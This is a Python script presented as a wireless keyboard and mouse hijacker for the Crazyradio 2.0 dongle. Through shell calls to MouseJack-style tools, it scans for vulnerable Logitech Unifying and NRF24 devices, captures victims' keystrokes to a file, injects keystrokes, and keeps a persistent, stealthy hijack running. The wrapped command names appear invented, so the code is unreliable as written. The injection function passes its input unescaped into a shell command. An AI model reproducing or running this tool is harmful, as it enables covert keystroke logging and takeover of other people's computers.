import argparse
import os
import time
import threading

# -------------------------------------------
# Crazyradio 2.0 Wireless Keyboard & Mouse Hijacker
# -------------------------------------------
# Features:
# - Scan for vulnerable Logitech Unifying & NRF24-based wireless input devices
# - Capture & replay keystrokes from target keyboards
# - Inject fake keystrokes/mouse movements into victim's system
# - Exploit weak pairing mechanisms in wireless keyboards & mice
# - Automate keystroke logging & replay
# - Implement stealth scanning to avoid detection
# - Enable persistent hijacking for long-term control
#
# Requirements:
# - Crazyradio 2.0 USB Dongle
# - Python 3.x
# - Mousejack Exploit Tool (https://github.com/BastilleResearch/mousejack)
#
# Usage:
# 1. Scan for vulnerable devices:
#    python crazyradio_mousejack.py --scan
# 2. Capture keystrokes:
#    python crazyradio_mousejack.py --capture --target XX:XX:XX:XX:XX:XX
# 3. Inject keystrokes:
#    python crazyradio_mousejack.py --inject "hello world"
# 4. Perform full hijack attack:
#    python crazyradio_mousejack.py --hijack --target XX:XX:XX:XX:XX:XX
# 5. Enable persistence for hijacked device:
#    python crazyradio_mousejack.py --persist --target XX:XX:XX:XX:XX:XX
# 6. Enable stealth scanning mode:
#    python crazyradio_mousejack.py --scan --stealth
# -------------------------------------------

def scan_devices(stealth_mode=False):
    """Scans for vulnerable wireless keyboards and mice with optional stealth mode."""
    print("[+] Scanning for Logitech Unifying & NRF24 input devices...")
    command = "mousejack_scan"
    if stealth_mode:
        command += " --stealth"
    os.system(command)

def capture_keystrokes(target):
    """Captures keystrokes from a target wireless keyboard."""
    print(f"[+] Capturing keystrokes from {target}...")
    os.system(f"mousejack_sniff --target {target} > captured_keystrokes.txt")
    print("[✔] Keystrokes saved to captured_keystrokes.txt")

def inject_keystrokes(payload):
    """Injects fake keystrokes into a target system."""
    print(f"[+] Injecting keystrokes: {payload}")
    os.system(f"mousejack_inject --text '{payload}'")
    print("[✔] Keystrokes injected successfully.")

def hijack_device(target):
    """Hijacks a vulnerable wireless keyboard or mouse."""
    print(f"[+] Hijacking target device: {target}")
    os.system(f"mousejack_hijack --target {target}")
    print("[✔] Device hijacked successfully.")

def persistent_hijack(target):
    """Keeps re-establishing hijack connection to the target."""
    print(f"[+] Enabling persistent hijack for {target}...")
    while True:
        hijack_device(target)
        time.sleep(10)

def main():
    parser = argparse.ArgumentParser(description="Crazyradio 2.0 Wireless Keyboard & Mouse Hijacker")
    parser.add_argument("--scan", action='store_true', help="Scan for vulnerable wireless input devices")
    parser.add_argument("--capture", action='store_true', help="Capture keystrokes from a target device")
    parser.add_argument("--inject", type=str, help="Inject keystrokes into a target system")
    parser.add_argument("--hijack", action='store_true', help="Perform a full device hijack")
    parser.add_argument("--persist", action='store_true', help="Enable persistent hijack mode")
    parser.add_argument("--stealth", action='store_true', help="Enable stealth scanning mode")
    parser.add_argument("--target", type=str, help="Target device MAC address")
    args = parser.parse_args()

    if args.scan:
        scan_devices(args.stealth)
    elif args.capture and args.target:
        capture_keystrokes(args.target)
    elif args.inject:
        inject_keystrokes(args.inject)
    elif args.hijack and args.target:
        hijack_device(args.target)
    elif args.persist and args.target:
        persistent_hijack(args.target)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
